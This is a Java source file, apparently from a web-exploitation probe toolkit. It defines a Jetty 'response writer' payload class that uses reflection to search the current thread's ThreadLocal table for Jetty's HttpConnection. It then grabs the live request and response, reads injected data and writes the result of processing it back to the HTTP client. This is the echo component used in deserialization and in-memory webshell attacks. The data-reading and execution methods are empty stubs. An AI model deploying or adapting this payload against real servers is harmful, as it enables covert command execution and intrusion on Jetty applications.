package com.reajason.javaweb.probe.payload.response;

import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 * @since 2025/8/5
 */
public class JettyWriter {
    public JettyWriter() {
        try {
            Thread thread = Thread.currentThread();
            System.out.println(thread);
            Object threadLocals = getFieldValue(thread, "threadLocals");
            Object table = getFieldValue(threadLocals, "table");
            for (int i = 0; i < Array.getLength(table); i++) {
                Object entry = Array.get(table, i);
                if (entry == null) {
                    continue;
                }
                Object value = getFieldValue(entry, "value");
                if (value != null && value.getClass().getName().endsWith("HttpConnection")) {
                    Object response;
                    Object request;
                    try {
                        Object httpChannel = invokeMethod(value, "getHttpChannel", null, null);
                        response = invokeMethod(httpChannel, "getResponse", null, null);
                        request = invokeMethod(httpChannel, "getRequest", null, null);
                    } catch (Exception e) {
                        response = invokeMethod(value, "getResponse", null, null);
                        request = invokeMethod(value, "getRequest", null, null);
                    }
                    if (request == null) {
                        continue;
                    }
                    // 在 Jetty12 ee8 ~ ee10 环境下
                    // request 对象为 org.eclipse.jetty.server.internal.HttpChannelState$ChannelRequest
                    // 非 ServletRequest 实现，考虑到场景可能比较少，适配代码较多，因此下面暂未适配
                    String data = getDataFromReq(request);
                    if (data != null && !data.isEmpty()) {
                        PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
                        try {
                            writer.write(run(data));
                        } catch (Throwable e) {
                            e.printStackTrace();
                            e.printStackTrace(writer);
                        }
                        writer.flush();
                        writer.close();
                        return;
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private String getDataFromReq(Object request) throws Throwable {
        return null;
    }

    private String run(String data) throws Throwable {
        return null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }
}
